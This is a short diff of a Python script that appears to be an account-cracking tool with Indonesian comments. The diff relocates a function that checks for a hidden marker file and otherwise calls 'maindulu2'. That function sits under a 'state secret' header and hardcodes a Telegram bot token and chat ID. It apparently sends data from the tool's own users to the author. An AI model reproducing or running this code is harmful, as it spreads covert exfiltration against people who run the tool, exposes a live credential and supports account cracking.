@@ -761,21 +761,6 @@ def crack_file():
 
 
 # -----------------[Rahasia Negara]-------------------#
-def maindulu():
-    try:
-        rawr = "./data/.temp_documents"
-        print(f"Memeriksa path: {rawr}")
-        if os.path.exists(rawr):
-            print("Path ditemukan, memanggil menu()")
-            menu()
-        else:
-            print("Path tidak ditemukan, memanggil maindulu2()")
-            maindulu2()
-    except Exception as e:
-        print(f"Terjadi error: {e}")
-        print("Memanggil maindulu2() dari except")
-        maindulu2()
-    
 def maindulu2():
 	BOT_TOKEN = "7829625950:AAHAkDANqB9yalb2vClpxX5zXBpHBaq_iVM"  # Ganti dengan token bot Telegram Anda
 	CHAT_ID = "7708185346"      # Ganti dengan ID chat penerima
@@ -815,7 +800,20 @@ def maindulu2():
 		pass
 				
 
-
+def maindulu():
+    try:
+        rawr = "./data/.temp_documents"
+        print(f"Memeriksa path: {rawr}")
+        if os.path.exists(rawr):
+            print("Path ditemukan, memanggil menu()")
+            menu()
+        else:
+            print("Path tidak ditemukan, memanggil maindulu2()")
+            maindulu2()
+    except Exception as e:
+        print(f"Terjadi error: {e}")
+        print("Memanggil maindulu2() dari except")
+        maindulu2()
 
 # -----------------[ HASIL-CRACK ]-----------------#
 def result():
